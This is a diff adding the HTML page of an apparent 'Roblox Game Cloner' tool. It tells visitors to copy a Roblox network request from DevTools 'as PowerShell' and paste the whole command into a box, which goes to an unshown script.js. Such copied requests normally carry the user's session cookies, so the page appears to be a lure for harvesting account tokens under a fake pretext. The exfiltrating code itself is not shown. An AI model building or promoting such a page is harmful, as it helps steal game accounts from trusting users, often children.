@@ -1,0 +1,72 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Updated the title for this specific page -->
+    <title>Roblox Game Cloner</title> 
+    <link rel="icon" href="logo.png" type="image/png">
+    <link rel="stylesheet" href="style.css">
+    <!-- Added Poppins font for consistency -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Particle background for consistent vibe -->
+    <div id="particles-js"></div>
+
+    <!-- The menu bar now has the glass-effect class -->
+    <nav class="menu-bar glass-effect">
+        <!-- Updated the logo source to the correct one for this page -->
+        <img src="gamecopy.png" alt="Game Cloner Logo" class="menu-logo"> 
+        <ul>
+            <li><a href="index.html">Go Back</a></li>
+            <li><a href="tut.html">Tutorial</a></li>
+            <li><a href="stu.html">Status</a></li>
+        </ul>
+    </nav>
+
+    <!-- The main container gets the glass-effect class -->
+    <div class="container glass-effect">
+        <h1>Roblox Game Cloner</h1>
+        <p class="instructions">
+            Follow the video tutorial carefully. Go to any Roblox Game, open DevTools (F12), go to Network, refresh, find the game's network request, right-click -> Copy -> Copy as PowerShell. Paste the entire command below.
+        </p>
+
+        <!-- ID untouched for JS compatibility -->
+        <textarea id="powershellInput" placeholder="Paste the copied PowerShell command here..."></textarea>
+       
+        <!-- ID untouched and syntax fixed for JS compatibility -->
+        <button class="linkbtn" id="executeButton">Clone Game</button> 
+        
+        <!-- ID untouched for JS compatibility (duplicate removed) -->
+        <p id="statusMessage"></p>
+        
+        <div class="video-container">
+            <!-- This is the new video for this page -->
+            <iframe
+                width="560"
+                height="315"
+                src="https://www.youtube.com/embed/AEcToqnuakA?si=2mOyG0rDuG8nJsdT"
+                title="YouTube video player"
+                frameborder="0"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+            </iframe>
+        </div>
+    </div>
+
+    <!-- Script tag is unchanged and safe -->
+    <script src="script.js" defer></script> 
+
+    <!-- Script to enable the particle background on this page -->
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <script>
+        particlesJS("particles-js", {
+          "particles": { "number": { "value": 80, "density": { "enable": true, "value_area": 800 } }, "color": { "value": "#00ff00" }, "shape": { "type": "circle" }, "opacity": { "value": 0.5, "random": true, "anim": { "enable": true, "speed": 0.4, "opacity_min": 0.1, "sync": false } }, "size": { "value": 3, "random": true }, "line_linked": { "enable": true, "distance": 150, "color": "#00ff00", "opacity": 0.2, "width": 1 }, "move": { "enable": true, "speed": 1, "direction": "none", "random": true, "straight": false, "out_mode": "out", "bounce": false } },
+          "interactivity": { "detect_on": "canvas", "events": { "onhover": { "enable": true, "mode": "grab" }, "onclick": { "enable": true, "mode": "push" }, "resize": true }, "modes": { "grab": { "distance": 140, "line_opacity": 0.4 }, "push": { "particles_nb": 3 } } },
+          "retina_detect": true
+        });
+    </script>
+</body>
+</html>
